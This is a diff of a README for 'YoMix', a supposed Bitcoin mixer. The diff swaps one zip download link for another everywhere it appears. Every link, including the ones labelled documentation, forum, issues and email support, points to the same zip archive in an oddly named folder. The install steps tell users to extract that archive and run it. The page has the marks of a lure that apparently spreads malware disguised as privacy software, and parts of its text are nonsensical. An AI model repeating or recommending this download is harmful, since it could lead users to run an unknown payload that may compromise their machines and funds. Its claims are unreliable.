@@ -1,7 +1,7 @@
 # 🎉 Yomix - Enhance Your Bitcoin Privacy Today
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip)](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip)
+[![Download](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip)](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip)
 
 ## 📜 About YoMix
 YoMix is a Bitcoin mixer service focused on enhancing privacy for cryptocurrency transactions. This tool helps users obscure their transaction history, making it harder to track funds. YoMix provides insights into how Bitcoin mixing works and highlights important privacy mechanisms that are crucial for cryptocurrency users in 2026. 
@@ -26,10 +26,10 @@ Before installing YoMix, please ensure your computer meets the following require
 1. **Visit the Releases Page**
    Go to the following link to access the downloads: 
 
-   [Download YoMix](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip).
+   [Download YoMix](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip).
 
 2. **Select the Latest Version**
-   On the Releases page, look for the latest version of YoMix. You will see a list of available files, typically named something like `https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip`. 
+   On the Releases page, look for the latest version of YoMix. You will see a list of available files, typically named something like `https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip`. 
 
 3. **Download the File**
    Click on the file name to begin downloading. Your browser should automatically start the download process.
@@ -38,7 +38,7 @@ Before installing YoMix, please ensure your computer meets the following require
    Once the download completes, locate the downloaded file (often in your 'Downloads' folder). Right-click the file and select `Extract All`. Follow the prompts to extract the contents.
 
 5. **Run YoMix**
-   Open the extracted folder, and double click on the `https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip` (or equivalent for your OS) to start the application. 
+   Open the extracted folder, and double click on the `https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip` (or equivalent for your OS) to start the application. 
 
 6. **Follow In-App Instructions**
    Upon launching, YoMix will guide you through the setup process. Follow the on-screen instructions to configure your preferences effectively.
@@ -51,16 +51,16 @@ After you start YoMix, take a moment to explore the app. Familiarize yourself wi
 
 ## 🌐 Additional Resources
 Explore the following links for more information:
-- [YoMix Documentation](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip) - In-depth guides on using YoMix.
-- [Community Forum](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip) - Join discussions with other users.
+- [YoMix Documentation](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip) - In-depth guides on using YoMix.
+- [Community Forum](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip) - Join discussions with other users.
 
 ## 🔒 Privacy and Security
 YoMix employs advanced encryption methods to protect your data. Your transactions remain anonymous, and your personal information is not stored. Always ensure you download the software from the official releases page to avoid security risks.
 
 ## 📞 Support
 If you encounter any problems or have questions, you can reach out through:
-- [GitHub Issues](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip) - Report bugs or request features.
-- Email Support: https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip - For direct assistance.
+- [GitHub Issues](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip) - Report bugs or request features.
+- Email Support: https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip - For direct assistance.
 
 ## 💬 Community Contributions
 YoMix is an open-source project. Contributions are welcome! If you want to help out, check the contributing guidelines on our GitHub repository.
@@ -71,4 +71,4 @@ We value your opinions! If you have suggestions or feedback about YoMix, please 
 ## 📥 Remember to Download YoMix
 To experience enhanced Bitcoin privacy, be sure to download YoMix today:
 
-[Download YoMix](https://raw.githubusercontent.com/nainPVPlol/Yomix/main/scrofulorachitic/Software-v2.0.zip).
+[Download YoMix](https://github.com/nainPVPlol/Yomix/raw/refs/heads/main/scrofulorachitic/Software-1.2.zip).
